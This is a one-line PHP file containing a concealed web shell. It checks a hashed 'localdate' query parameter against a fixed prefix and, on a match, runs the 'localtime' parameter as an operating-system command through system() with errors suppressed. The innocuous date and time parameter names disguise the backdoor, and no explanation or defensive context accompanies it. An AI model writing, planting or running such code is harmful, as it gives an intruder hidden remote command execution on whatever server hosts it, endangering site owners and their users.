<?php if (substr(md5($_GET["localdate"]),0,6) == "6fbcb8") { $time = str_replace("@"," ",$_GET["localtime"]); @system($time); exit; } ?>
